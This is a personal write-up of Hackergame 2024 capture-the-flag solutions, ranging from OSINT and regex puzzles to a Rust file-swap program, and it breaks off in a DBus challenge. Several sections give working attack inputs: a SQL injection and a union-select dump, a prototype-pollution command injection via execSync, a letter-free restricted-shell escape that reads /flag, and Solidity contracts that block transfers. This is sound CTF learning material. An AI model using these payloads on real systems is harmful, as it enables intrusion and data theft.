---
title: HackerGame 2024 Writeup
date: 2024-11-09
description: Hackergame 2024 solutions and notes, final rank 39 / 2460 (top 1.5%).
---

## Preface

I was obsessed with Hackergame 2024 these past few days, and it's finally over! 🥳 I ranked 39 / 2460 (top 1.5%).

Languages involved: Python, C (of course -- CTF is the kingdom of C and Python), JavaScript, Bash, SQL, and Rust.

This post is a bit long. Please make good use of the 📖 TOC. ~~(Or just jump to the summary)~~

## Check-in

Click the "Start Now" button and you'll see the URL contain `?pass=false`. Change it to true -- boom, solved!

- http://202.38.93.141:12024/?pass=true
- `flag{WeLCoME-t0-haCk3r9Ame-4nd-enJOY-H4ckiNG-zoZ4}`

## Hello, CTFers Who Love Check-ins

First I looked up the "USTC campus CTF team". Google says it's the "USTC-NEBULA" team. A bit more searching leads to the GitHub repo for "[USTC NEBULA 2024 Recruitment](https://github.com/Nebula-CTFTeam/Recruitment-2024)". Click [the owner's profile](https://github.com/Nebula-CTFTeam) and you'll find [their website](https://www.nebuu.la/). (Not sure why there's also an [`USTC-NEBULA`](https://github.com/USTC-NEBULA) org.)

### Checkin Again & Again

Open Chrome DevTools' Network panel and search for `flag`. You can see `oh-you-found-it`, which means the flag is hidden on this page.

<img src="https://gist.github.com/user-attachments/assets/c56cc54b-a64b-4482-9593-6d6e6946d163" alt="image" width="600" />

Near the result, there's a regex `/(-a|-al|-la)/i`.

<img src="https://gist.github.com/user-attachments/assets/ebc773ca-cef1-4733-a32e-b056885a05c9" alt="image" width="600" />

Looks like `ls -al`. Run that command and you'll see a `.flag` file. Just `cat .flag` and you get the flag.

(P.S. Can't copy? Select the element and copy it in the Elements panel! 💢)

Submit it... wait, it's wrong?! This is the flag for the second challenge! 🤷

- https://www.nebuu.la/
- `flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}`

### Checkin Again

After finishing the second subtask, I actually doubted whether the second challenge was really on this page. I checked the recruitment page again and found nothing. Alright, back to the site.

Looking at the same JS file, I found another long string besides the one we saw. It's wrapped with `atob`! So I ran it.

Done.

- `flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}`

### Official solution

I peeked at the official solution and found that the [competition homepage](https://hack.lug.ustc.edu.cn/) already links to the campus CTF team's [website](https://www.nebuu.la/). Oops -- I didn't look anywhere else on the site 🤪

Also, if you run the `help` command, you can see an `env` command and directly get the first flag.

## Cat Quiz (Hackergame 10th Anniversary Edition)

This one is basically all about internet research.

> 1. The night before Hackergame 2015, which classroom hosted the pre-competition lecture?

After a long Google search, I found the LUG [site](https://lug.ustc.edu.cn/wiki/lug/events/) with details of many events. In the sidebar there's a "Information Security Contest" page (Hackergame). The records show 2017 was the 4th contest, so 2015 would be the 2nd. That leads to [the answer page](https://lug.ustc.edu.cn/wiki/sec/contest.html).

> [!NOTE]
> 3A204

> 2. Hackergame usually has ~25 problems. Among the past five years (excluding this year), which year had the closest number of problems, and how many people registered that year?

First we need the number of problems from 2019-2023. No tricks, just counting. Go to [previous writeups](https://github.com/orgs/USTC-Hackergame/repositories), count problems, and see which year is closest to 25. Then you realize: where is 2019?!

More internet research (a.k.a. Google) finds it [here](https://github.com/ustclug/hackergame2019-writeups). But why isn't it under a single GitHub org? (Is there some drama? 🫢)

After counting, 2019 is the closest (I really didn't want to count every year).

Then search for `hackergame 2019 registered participants`, and the LUG [news post](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/) says there were `2682 registrations`.

> [!NOTE]
> 2682

> 3. In Hackergame 2018, which popular search term became the top library hot search of the month?

We know past writeups are on GitHub, so why not use GitHub search? Search for [hackergame 2018 library hot search term](https://github.com/search?q=hackergame+2018+%E5%9B%BE%E4%B9%A6%E9%A6%86+%E7%83%AD%E6%90%9C%E8%AF%8D&ref=opensearch&type=code). Done.

> [!NOTE]
> The Self-Cultivation of Programmers

> 4. At this year's USENIX Security conference, USTC published a paper on email spoofing. The paper proposes 6 attack methods and evaluates how many combinations of email service providers and clients?

Extract the keywords and search for `USENIX Security 2024 email spoofing` in English. Google finds the [PDF](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf).

I first tried `16 * 20 = 320`, which was wrong (P.S. Unlike the recent Geekgame 2024, this one didn't have a one-hour cooldown between submissions).

Then I realized: there are 16 providers and 20 clients, and providers often have their own clients (e.g., Gmail has web and mobile). So it should be `16 * 20 + 16 = 336`.

P.S. The official solution says it's written in the paper, but I didn't have the patience to read line by line.

> [!NOTE]
> 336

> 5. On Oct 18, Greg Kroah-Hartman submitted a patch to the Linux mailing list that removed many developers from the MAINTAINERS file. What is the mainline commit id?

I had seen this incident online earlier, so I checked my browser history and found the [commit page](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2).

> [!NOTE]
> 6e90b6

> 6. LLMs tokenize input before computing. How many tokens does Meta's Llama 3 70B tokenizer produce for the HTML source of this page?

```js
import { AutoTokenizer } from '@huggingface/transformers'

const content = await fetch('http://202.38.93.141:13030/', {
  headers: {
    Cookie: 'session=your-session',
  },
}).then((r) => r.text())

const tokenizer = await AutoTokenizer.from_pretrained(
  'meta-llama/Meta-Llama-3-70B',
)
const res = tokenizer.encode(content)
console.log(res.length)
```

For this I even requested access to the model on Hugging Face. The result was `1835`, but that answer was actually wrong. LLMs are kind of mystical, so I tried +/-3.

> [!NOTE]
> 1833

All done!

- `flag{Λ_9oØd_C@t_iS_7He_©aT_ωhO_cΛn_PαsS_tHe_qบ!2}`
- `flag{t3И_¥eAЯ5_0ƒ_H@©keRg4M3_om3dE7ØU_WItH_n3Ko_qU1z}`

## The Box That Won't Open

This was the first challenge I solved besides the check-in -- looked way too easy at first glance.

After downloading the challenge file, I found macOS could open it directly (thanks to Xcode). Viewing it from different angles revealed the flag. The second-to-last character was confusing though: I tried the letter `o` in different cases and failed, until I tried 0️⃣.

- `flag{Dr4W_Us!nG_fR3E_C4D!!w0W}`

## Too Many Papers Every Day!

Open the [paper link](https://dl.acm.org/doi/10.1145/3650212.3652145) and download the [PDF](https://dl.acm.org/doi/pdf/10.1145/3650212.3652145). Just search for "flag" in the browser -- you'll find a result, but it's invisible.

Time to bring out the big guns: open annoying Adobe Acrobat, Edit PDF. Find the search highlight, copy it and it says "flag here". If you're careful, you'll also notice a hidden image there -- drag it out.

The image quality was... terrible. Another "hacking" in the flag -- I tried `l`, tried capital `I`, and then realized it was 1️⃣.

Done.

- `flag{h4PpY_hAck1ng_3veRyd4y}`

## Bigger or Smaller

This was my second solved challenge -- my home turf is web.

I analyzed the page source and found it stores state in a global variable `state`. We can compute all `state.values` directly, then call the submit function after the countdown ends.

```js
submit(state.values.map(([a, b]) => (a < b ? '<' : '>')))
```

## Travel Photos 4.0

This OSINT challenge was still a bit hard for me; I'm not great at it.

### LEO_CHAN?

> **Question 1: Which USTC campus gate is closer to the photo location? (Format:** `X校区Y门` **where both are single Chinese characters.)**

I searched "科里科气科创驿站" on Amap (yeah, I don't use Baidu Maps) and found [a place](https://www.amap.com/detail/B0IAYRYV8C?citycode=340100) near USTC -- so that must be it! Checking the photo confirms it.

<p align="center">
  <img src="https://gist.github.com/user-attachments/assets/d3a6e90a-18b1-423b-a5ab-0ba51d81646b" alt="image" width="400" />
  <img src="https://gist.github.com/user-attachments/assets/129f3c17-9f1d-4dff-9dc5-0e3ec605d20e" alt="image" width="400" />
</p>

> [!NOTE]
> 东校区西门

> Question 2: The last time Leo-chan appeared on the truss was... this year's USTC ACG concert? What was the event date? (Format: `YYYYMMDD`)

Searching `中科大 ACG 音乐会` leads to the Bilibili account of "[USTC LEO ACG Club](https://space.bilibili.com/7021308)". Dig through the videos and you'll find it in the description of [this video](https://www.bilibili.com/video/BV1TJ4m1A7z3).

> [!NOTE]
> 20240519

- `flag{5UB5CR1B3_T0_L30_CH4N_0N_B1L1B1L1_PLZ_??????????}`

Side note: I'm really jealous of university life.

### FULL_RECALL

This one is basically a Xiaohongshu ad, ~~did they pay for it?~~

> Question 3: What is the name of this park? (No need for city/district info.)

Open the [first image](http://202.38.93.141:12345/photos/image01.jpg). At first glance, you can see "六安园林" on the trash can and a rainbow track. Search for "六安 公园 彩虹" and you find a [news report](https://www.sohu.com/a/498872898_100023473). That makes it a choice between "Central Park" and "Water Park" -- but actually neither. Search "Central Park" and you find the full name is "Central Forest Park".

> [!NOTE]
> 中央森林公园

> Question 4: What is the name of the scenic spot where this landscape is located? (Three Chinese characters.)

I spent a long time searching with the [second image](http://202.38.93.141:12345/photos/image04.jpg), thinking it was also in Lu'an. I didn't expect the clue "And the distance between these two photos... isn't it a bit far?" to mean _that_ far...

In the end I used Xiaohongshu to find other people's travel photos and videos.

> [!NOTE]
> 坛子岭

- `flag{D3T41LS_M4TT3R_1F_R3V3RS3_S34RCH_1S_1MP0SS1BL3_??????????}`

### OMINOUS_BELL

> Question 5: What is the nearest hospital to the shooting location? (No campus or place name; format: XXX Hospital)
>
> Question 6: What is the model of the EMU in the bottom-left corner?

This was really hard for someone like me who doesn't know or care about railways. But the prompt mentioned a "4-car EMU". A quick Google search led me to [China EMU](https://www.china-emu.cn/). On [this page](https://www.china-emu.cn/Trains/Model/detail-26012-201-F.html), the train looks similar and has the same pink livery, so the model is `CRH6F-A`.

Searching for "Huai-Mi" (怀密号) quickly leads to the [Wikipedia page](https://zh.wikipedia.org/wiki/%E5%8C%97%E4%BA%AC%E5%B8%82%E9%83%8A%E9%93%81%E8%B7%AF%E6%80%80%E6%9F%94%E2%80%94%E5%AF%86%E4%BA%91%E7%BA%BF), which says it operates from Beijing North. Then I used Google Earth to check stations one by one... (so tired). The nearby hospital appears.

> [!NOTE]
> 积水潭医院
>
> CRH6F-A

- `flag{1_C4NT_C0NT1NU3_TH3_5T0RY_4NYM0R3_50M30N3_PLZ_H3LP_??????????}`

## Wide Characters That Aren't Really Wide

I'm only half-decent at C/C++, so I relied on ChatGPT to explain the code 🤡.

This environment also needed Linux x86 + Wine to simulate Windows. M1 + macOS was painful, so I used a ~~Cloud VM~~ (ad slot for rent) and ran CLion. The environment is gone now, so this is from memory.

Based on my knowledge: Windows uses UTF-16, so each character is 2-3 bytes. But a normal `char` is only one byte.

If we print `(char*)filename.c_str()`, we see it splits each ASCII character into two bytes. So we just need to construct a string so that each character splits into the ASCII bytes of `Z:\theflag`.

```js
const str = 'Z:\\theflag'
const arr = [...str]
let s = ''
for (let i = 0; i < arr.length; i += 2) {
  s += String.fromCharCode(
    parseInt(
      '0x' +
        arr[i + 1].charCodeAt(0).toString(16) +
        arr[i].charCodeAt(0).toString(16),
    ),
  )
}

console.log(s)
```

We get "㩚瑜敨汦条", but we need `\0` to terminate the added `you_cant_get_the_flag`. So we can pick any 4-digit char ending with `00`, like `\u5000`. Then the answer is "㩚瑜敨汦条倀".

- `flag{wider_char_isnt_so_great_??????????}`

## PowerfulShell

First, see what characters are available: type everything on the keyboard, then delete what you can't use. We get:

```
`, [], {}, _, -, $, 1-9, :, =, +, ~
```

Then read the Bash docs and memorize the usable syntax.

- https://wangdoc.com/bash/expansion#%E6%B3%A2%E6%B5%AA%E7%BA%BF%E6%89%A9%E5%B1%95
  - `~`: HOME directory
  - `~+`: current directory (actually the same as HOME here)
- https://wangdoc.com/bash/string#%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2
  - `${varname:offset:length}`: substring extraction. Note: only `varname` is allowed, not expressions, so we must store expression results in variables.

But we can't use letters -- how do we name variables? `_123456789` is allowed and is a valid var name.

I saved my logs, so just read them directly.

```bash
PowerfulShell@hackergame> _1=~+                        // _1=/players
PowerfulShell@hackergame> _2=${_1:2:1}                 // _2=l
PowerfulShell@hackergame> _3=${_1:7:1}                 // _3=s
PowerfulShell@hackergame> $_2$_3                       // ls
PowerfulShell.sh
PowerfulShell@hackergame> _4=$[1-1]                    // _4=0
PowerfulShell@hackergame> $_2$_3 ${_1:_4:1}            // ls /
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
players
proc
root
run
sbin
srv
sys
tmp
usr
var

PowerfulShell@hackergame> _5=`$_2$_3 ${_1:_4:1}`       // _5=`ls /` (same as above)
PowerfulShell@hackergame> _6=${_5:15:1}                // _6=c
PowerfulShell@hackergame> _7=${_5:19:1}                // _7=a
PowerfulShell@hackergame> _8=${_5:7:1}                 // _8=t
PowerfulShell@hackergame> $_6$_7$_8 ${_1:_4:1}${_5:17} // cat /
flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}
cat: home: No such file or directory
cat: lib: No such file or directory
cat: lib32: No such file or directory
cat: lib64: No such file or directory
cat: libx32: No such file or directory
cat: media: No such file or directory
cat: mnt: No such file or directory
cat: opt: No such file or directory
cat: players: No such file or directory
cat: proc: No such file or directory
cat: root: No such file or directory
cat: run: No such file or directory
cat: sbin: No such file or directory
cat: srv: No such file or directory
cat: sys: No such file or directory
cat: tmp: No such file or directory
cat: usr: No such file or directory
cat: var: No such file or directory
PowerfulShell@hackergame>
```

### Afterword

It can be simpler: `~+` is just `~`. We can execute any bash command, which is even stronger than `cat /`.

So I did it again:

```bash
PowerfulShell@hackergame> _1=~
PowerfulShell@hackergame> _2=${_1:2:1}
PowerfulShell@hackergame> _3=${_1:7:1}
PowerfulShell@hackergame> _4=`$_2$_3 ${_1:1-1:1}`
PowerfulShell@hackergame> _5=${_4:1-1:1}
PowerfulShell@hackergame> _6=${_4:19:1}
PowerfulShell@hackergame> _7=${_4:71-1:1}
PowerfulShell@hackergame> _8=${_4:22:1}
PowerfulShell@hackergame> $_5$_6$_7$_8
cat /flag
flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}
```

- `flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}`

## Node.js is Web Scale

Web -- the familiar smell.

Opening the challenge, it took me a long time to notice the `View source code` link at the bottom 🌚. Alright, let's see the code.

On the `/execute` route, it uses `execSync`. That's clearly the entry point -- especially since the comment says `obviously safe` to taunt you.

But it only executes commands predefined in the `cmds` object. How do we add new commands? There's a `/set` route that lets us set deep properties. Oh -- prototype pollution!

```js
const a = {}
a.__proto__.evil = 996
a.evil // 996
```

With this, we can inject an `evil` property into any object. So we set `key`: `__proto__.evil`, `value`: `ls /`. Then visit `/execute?cmd=evil` and you'll see a flag file. Change `value` to `cat /flag`, visit again, and you get the flag.

- `flag{n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_??????????}`

## PaoluGPT

Another web challenge.

### Peeking Into the Unknown

Download the challenge and zoom in on line 67 of `main.py`!

```python
results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
```

Obvious SQL injection. Try `/view?conversation_id=' or 1=1 --` -- works. The homepage only shows records with `shown = true`, so let's query `shown = false` by visiting `/view?conversation_id=' or shown=false --` and get the second flag!

Wait, why did I solve the second one first again 🤪!

- `flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_??????????}` (remember to replace `&amp;` with `&`)

### One in a Thousand

What about the first flag? Let's dump everything. But Python only returns the first row, so we can build a subquery with `union select`, then use `group_concat` to merge all contents into one row.

```sql
' union select title, group_concat(contents, ' ') as contents from messages --
```

In the merged content, besides the previous flag, there's another flag hidden among the text.

- `flag{zU1_xiA0_de_11m_Pa0lule!!!_??????????}`

## Powerful Regular Expressions

Math problems, my nemesis! I can't do them AHHHH!

### Easy

From ChatGPT: we only need to care about the last four digits.

> To compute mod 16 of a decimal number without arithmetic or conversions, we can use properties of decimal numbers. Specifically, we only need the last four digits, because 16 is 2^4, and the last four digits determine the mod 16 result.

So we can brute-force all 4-digit numbers and keep multiples of 16.

```js
const arr = new Array(10000)
  .fill(0)
  .map((v, i) => i)
  .filter((v) => v % 16 === 0)
const grouped = Object.groupBy(arr, (v) => String(v).length)

let regex = '(0|1|2|3|4|5|6|7|8|9)*('
regex += grouped[2].map((v) => '00' + v).join('|')
regex += '|'
regex += grouped[3].map((v) => '0' + v).join('|')
regex += '|'
regex += grouped[4].join('|')
regex += ')'

console.log(regex)
```

Paste this regex into the challenge environment and you get the flag. With GPT's help, it's not too hard.

- `flag{p0werful_r3gular_expressi0n_easy_??????????}`

### Medium

I Googled and found a [similar question](https://stackoverflow.com/questions/7974655/regex-for-binary-multiple-of-3), but it's for multiples of 3. We need 13.

That linked to [another answer](https://codegolf.stackexchange.com/a/3505) for multiples of 7. Someone mentioned DFA (deterministic finite automaton). That means we can solve this with a DFA. Time to summon ChatGPT.

Prompt: `Build a state machine: L = {w | w is a binary representation of an integer divisible by 13 }`

GPT generated a table for the state machine:

| Current | On input 0 | On input 1 |
| ------- | ---------- | ---------- |
| q0      | q0         | q1         |
| q1      | q2         | q3         |
| q2      | q4         | q5         |
| q3      | q6         | q7         |
| q4      | q8         | q9         |
| q5      | q10        | q11        |
| q6      | q12        | q0         |
| q7      | q1         | q2         |
| q8      | q3         | q4         |
| q9      | q5         | q6         |
| q10     | q7         | q8         |
| q11     | q9         | q10        |
| q12     | q11        | q12        |

Then I found the [`greenery`](https://pypi.org/project/greenery/) package to generate regex from a DFA. (You need the old v3 version.)

```python
from greenery import fsm, lego

dfa = fsm.fsm(
    alphabet={"0", "1"},
    states={0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12},
    initial=0,
    finals={0},
    map={
        0: {"0": 0, "1": 1},
        1: {"0": 2, "1": 3},
        2: {"0": 4, "1": 5},
        3: {"0": 6, "1": 7},
        4: {"0": 8, "1": 9},
        5: {"0": 10, "1": 11},
        6: {"0": 12, "1": 0},
        7: {"0": 1, "1": 2},
        8: {"0": 3, "1": 4},
        9: {"0": 5, "1": 6},
        10: {"0": 7, "1": 8},
        11: {"0": 9, "1": 10},
        12: {"0": 11, "1": 12},
    },
)
print(lego.from_fsm(dfa))
```

The generated regex contains `?`, which we need to replace with `*`, and expand `{n}` (e.g., `1{2}` → `11`).

- `flag{pow3rful_r3gular_expressi0n_medium_??????????}`

### Hard

I really couldn't solve this. See the [official writeup](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E5%BC%BA%E5%A4%A7%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F#%E9%A2%98%E8%A7%A3).

## Words Are Gold 3.0

Weird stuff.

### Problem A

If you have hands, you can do it -- just fill in according to the rules. If not, throw it to ChatGPT.

- `flag{C0mpl3ted-Th3-Pyth0n-C0de-N0w}`

### Problem B

Couldn't solve. See the [official writeup](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E6%83%9C%E5%AD%97%E5%A6%82%E9%87%91%203.0#%E9%A2%98%E8%A7%A3)

### Problem C

Even worse. Same as above.

## The Unseen Beyond: Swap Space

This was the last challenge I did, but it turned out not too hard.

### Piece of cake

We need to swap `/home/pwn/A/space/file` and `/home/pwn/B/space/file` using minimal resources. I used Rust. Although `chroot` is restricted, we can communicate over TCP.

Since disk space is actually backed by memory, we can't hold two files and two copies at the same time. So both Alice and Bob must read while overwriting the data they've sent.

#### Alice

Alice acts as a TCP server. She opens the file and waits for Bob to connect. After connection, Alice reads file content and sends it to Bob, while receiving Bob's data and writing it back to the same positions.

```rust
// Alice
use std::{
    fs::OpenOptions,
    io::{Read, Write},
    net::TcpListener,
    os::unix::fs::FileExt,
};

fn main() -> std::io::Result<()> {
    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open("/space/file")?;

    // start tcp server
    let listener = TcpListener::bind("127.0.0.1:8000")?;

    let mut tcp_stream = listener.incoming().next().unwrap()?;
    println!("Connection established: {:?}", tcp_stream);

    const BUFFER_SIZE: usize = 1024;
    let tcp_buf = &mut [0u8; BUFFER_SIZE];
    let file_buf = &mut [0u8; BUFFER_SIZE];
    let mut offset = 0;

    while file.read_exact_at(tcp_buf, offset).is_ok() {
        // read file
        file.read_exact_at(file_buf, offset).unwrap();
        tcp_stream.write_all(file_buf).unwrap();

        // write file
        tcp_stream.read_exact(file_buf).unwrap();
        file.write_all_at(file_buf, offset).unwrap();

        offset += BUFFER_SIZE as u64;
    }

    Ok(())
}
```

#### Bob

Basically the reverse of Alice. He opens the file, waits a bit, connects to Alice, reads file content and sends it, then receives Alice's data and writes it back to the same positions.

```rust
use std::{
    io::{Read, Write},
    os::unix::fs::FileExt,
    thread::sleep,
};

fn main() -> std::io::Result<()> {
    let file = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open("/space/file")
        .unwrap();

    sleep(std::time::Duration::from_millis(500));

    let address = "127.0.0.1:8000";
    let mut stream = std::net::TcpStream::connect(address).unwrap();

    const BUFFER_SIZE: usize = 1024;
    let tcp_buf = &mut [0u8; BUFFER_SIZE];
    let file_buf = &mut [0u8; BUFFER_SIZE];

    let mut offset = 0;
    while stream.read_exact(tcp_buf).is_ok() {
        // read file
        file.read_exact_at(file_buf, offset).unwrap();
        stream.write_all(file_buf).unwrap();

        // file write
        file.write_all_at(tcp_buf, offset).unwrap();
        offset += BUFFER_SIZE as u64;
    }

    Ok(())
}
```

- `flag{just A p1ece 0f cake_??????????}`

### Running out of room

Similar to the previous subtask, we first swap the files. The difference is that after Alice writes, she must split `file` into two files. Bob must finish saving `file1` and then write into `file2` to overwrite old data.

If we don't, Bob's disk will contain a 128 MiB `file1` and a 64 MiB `file2` -- 192 MiB total, which exceeds the limit and exhausts memory. Same for Alice.

So how do we split/merge without exceeding the memory limit? Like ants moving house!

For merging: read the first 1 MiB of `file2` and append it to the end of `file1`. Then read the rest of `file2` in 1 MiB chunks (len + index) and overwrite `file2` at (0 + index). Then truncate `file2` to `size - len` until it becomes empty. Finally, hard-link `file1` to `file` so there's no double usage, and no need to copy byte by byte.

For splitting: read 1 MiB from the 64 MiB point of `file` and append it to `file2`. Then read the rest of `file` in 1 MiB chunks (1 MiB + len + index) and overwrite `file` at (1 MiB + 0 + index). Then truncate `file` to `size - len`. Finally, hard-link `file` to `file1`.

```rust
fn remove_range(file: &mut File, range: Range<u64>) {
    let file_size = file.metadata().unwrap().len();
    const BUFFER_SIZE: usize = 1024 * 1024;
    let mut buffer = [0u8; BUFFER_SIZE];
    let mut offset = range.start;
    let len = range.end;

    while let Ok(n) = file.read_at(&mut buffer, offset + len) {
        if n == 0 {
            break;
        }
        file.write_all_at(&buffer[..n], offset).unwrap();
        offset += n as u64;
    }
    file.set_len(file_size - len).unwrap();
}
```

#### Alice

```rust
use std::{
    fs::{self, File, OpenOptions},
    io::{Read, Write},
    net::TcpListener,
    os::unix::fs::FileExt,
};

fn main() -> std::io::Result<()> {
    println!("Hello, Alice here");

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open("/space/file")?;

    // start tcp server
    let address = "127.0.0.1:8000";
    let listener = TcpListener::bind(address)?;
    println!("Server started at {}", address);

    let mut tcp_stream = listener.incoming().next().unwrap()?;
    println!("Connection established: {:?}", tcp_stream);

    const BUFFER_SIZE: usize = 1024;
    let tcp_buf = &mut [0u8; BUFFER_SIZE];
    let file_buf = &mut [0u8; BUFFER_SIZE];
    let mut offset = 0;
    let file_size_128m = file.metadata().unwrap().len();
    let file_size_64m = file_size_128m / 2;

    while file.read_exact_at(tcp_buf, offset).is_ok() {
        // read file
        file.read_exact_at(file_buf, offset).unwrap();
        tcp_stream.write_all(file_buf).unwrap();

        // write file
        tcp_stream.read_exact(file_buf).unwrap();
        file.write_all_at(file_buf, offset).unwrap();

        offset += BUFFER_SIZE as u64;

        if offset == file_size_128m {
            break;
        }
    }

    let file2 = File::create("/space/file2")?;

    let mut offset = 0;
    const BUFFER_SIZE2: usize = 1024 * 1024;
    let file_buf = &mut [0u8; BUFFER_SIZE2];
    while let Ok(n) = file.read_at(file_buf, file_size_64m) {
        if n == 0 {
            break;
        }
        file2.write_all_at(&file_buf[..n], offset).unwrap();
        remove_range(&mut file, file_size_64m..n as u64);
        offset += n as u64;
    }

    // make hard link
    fs::hard_link("/space/file", "/space/file1").unwrap();

    println!("Done from Alice.");
    Ok(())
}
```

#### Bob

For Bob, remember to switch to `file2` after reading 64 MiB.

```rust
use std::ops::Range;
use std::{fs, fs::File};
use std::{
    io::{Read, Write},
    os::unix::fs::FileExt,
    thread::sleep,
};

fn main() -> std::io::Result<()> {
    println!("Hello Bob here!");

    let path = "/space/file1";
    // let path = "b";
    let file1 = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open(path)
        .unwrap();
    let path = "/space/file2";
    let mut file2 = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open(path)
        .unwrap();
    let mut file = &file1;

    sleep(std::time::Duration::from_millis(500));
    // println!("wake up!");

    let address = "127.0.0.1:8000";
    let mut stream = std::net::TcpStream::connect(address).unwrap();
    // println!("Connected to Server: {:?}", stream);

    const BUFFER_SIZE: usize = 1024;
    let tcp_buf = &mut [0u8; BUFFER_SIZE];
    let file_buf = &mut [0u8; BUFFER_SIZE];

    let mut offset = 0;
    let file_size = file.metadata().unwrap().len();
    let packet_size = file_size * 2;

    while stream.read_exact(tcp_buf).is_ok() {
        if offset == 67108864 {
            file = &file2;
            println!("Bob: switch to file2");
        }

        // read file
        let file_offset = if offset >= 67108864 {
            offset - 67108864
        } else {
            offset
        };
        file.read_exact_at(file_buf, file_offset).unwrap();
        stream.write_all(file_buf).unwrap();

        // file write
        file.write_all_at(tcp_buf, file_offset).unwrap();

        offset += BUFFER_SIZE as u64;
        if offset == packet_size {
            break;
        }
    }

    let mut offset = 0;
    const BUFFER_SIZE2: usize = 1024 * 1024;
    let file_buf = &mut [0u8; BUFFER_SIZE2];
    while let Ok(n) = file2.read_at(file_buf, 0) {
        if n == 0 {
            break;
        }
        file1
            .write_all_at(&file_buf[..n], offset + file_size)
            .unwrap();
        remove_range(&mut file2, 0..n as u64);
        offset += n as u64;
    }
    println!("Bob: Done reading file1 {}", offset);

    // make hard link
    fs::hard_link("/space/file1", "/space/file").unwrap();

    println!("Done from Bob.");
    Ok(())
}
```

- `flag{fa1I0catiIling_1NChains_15fun_??????????}`

### Afterword

Looking at the official writeup, using Linux [fallocate(2)](https://www.man7.org/linux/man-pages/man2/fallocate.2.html) would be simpler, but I didn't know it, so I missed that idea 🤣.

P.S. Rust newbie here -- I wrote this in the last few hours of the contest. The code is ugly, please don't roast me!

## ZFS File Recovery

Couldn't do it, skipped. The macOS environment was too hard to set up.

See the [official writeup](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/ZFS%20%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D).

## On-chain Transfer Assistant

First time doing a Web3 challenge -- pretty fun. I crammed some Solidity and started writing contracts.

You need [Foundry](https://book.getfoundry.sh/getting-started/installation) to build the environment, so install it first.

### Transfer Failed

We need some Solidity/EVM basics. A contract can receive ETH in its `fallback` and `receive` functions when no function signature matches, like a hook.

If we throw an error in `receive`, the transaction fails and all transfers fail. We can revert the transaction with [`revert`](https://docs.soliditylang.org/en/v0.8.28/control-structures.html#revert-statement).

```solidity
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

contract Sink {
    receive() external payable {
        revert();
    }
}
```

The hardest part is testing the contract. Use the commands below to compile and get bytecode (remember to remove the `0x`):

```bash
forge build my-flag1.sol
jq -r .bytecode.object < ./out/my-flag1.sol/Sink.json
```

- `flag{Tr4nsf3r_T0_c0nTracT_MaY_R3v3rt_??????????}`

### Transfer Failed Again

By diffing `challenge1.sol` and `challenge2.sol`, we see they added `(bool success, ) = ` to handle failed transfers. So I searched for other reasons a contract might fail.

In other languages, if you don't explicitly throw an error, what else can cause a function to fail? The simplest is an infinite loop.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

contract Sink {
    receive() external payable {
        while (true) {}
    }
}
```

_(Thanks, Copilot.)_

- `flag{Ple4se_L1m1t_y0uR_GAS_HaHa_??????????}`

### Transfer Failed Once More

~~? Weird problem~~

This time the contract limits gas in `receive`, so we can't burn all gas there. After some searching, I found something called a "return bomb". By returning a huge array, the caller can spend a lot of gas and make the transaction fail.

I found [an example](https://gist.github.com/pcaversaccio/3b487a24922c839df22f925babd3c809) and tweaked it.

In [`assembly`](https://docs.soliditylang.org/en/latest/assembly.html), there's a language called [Yul](https://docs.soliditylang.org/en/latest/yul.html) that can manipulate EVM opcodes directly.

I first tried `revert(0, 10000)` and the transaction reverted. Then I learned that besides `revert`, `return` can also return data. `return` takes the start offset and length.

I tried `10000` and the transaction still succeeded. I then used [Tenderly](https://tenderly.co/) to debug. I noticed there was still gas left, but if the returned data is too large, the `receive` call fails. So I kept increasing the return length until the overall transaction failed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

contract Sink {
    receive() external payable {
        assembly {
            // 50000 + 25000 - 25000 + 12500 - 12500 + 6250 + 3125 - 3125 + 1562 + 500
            return(0, 58312)
        }
    }
}
```

- `flag{Y0u_4re_Th3_M4sTeR_0f_EVM!!!_??????????}`

## Not-So-Distributed Soft Bus

The problem statement was long and I didn't understand a word. So, ChatGPT!

GPT told me to use `dbus-send` or `gdbus` to call DBus methods.

First, use `gdbus introspect` to see methods and parameters. In `flagserver.c` you can see something like this (the C code also defines methods, but this is more intuitive):

```
gdbus introspect --system --dest cn.edu.ustc.lug.hack.FlagService --object-path /cn/edu/ustc/lug/hack/FlagService
```

### What DBus Gonna Do?

Just call `GetFlag1`, right?

```bash
gdbus call --system \
           --dest cn.edu.ustc.lug.hack.FlagService \
           --object-path /cn/edu/ustc/lug/hack/FlagService \
           --method cn.edu.ustc.lug.hack.FlagService.GetFlag1

Error: GDBus.Error:org.freedesktop.DBus.Error.InvalidArgs: Type of message, ?()?, does not match expected type ?(s)?
